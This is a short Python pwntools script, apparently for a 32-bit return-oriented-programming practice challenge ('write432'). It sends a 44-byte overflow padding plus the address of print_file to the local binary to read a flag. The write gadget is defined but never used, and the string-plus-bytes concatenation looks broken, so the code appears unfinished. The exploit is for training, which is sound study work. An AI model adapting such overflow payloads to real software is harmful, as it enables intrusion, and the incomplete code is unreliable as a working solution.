from pwn import *

X86_PADDING = 44

elf = context.binary = ELF('write432')
rop = ROP(elf)

print_file = p32(elf.symbols.print_file)
# write_to_memory = rop.find_gadget(['mov'])
write_to_memory = p32(0x08048543)

payload = "A" * X86_PADDING + print_file

io = process(elf.path)
io.recvuntil('> ')
io.sendline(payload)
flag = io.recvall()
print(flag)

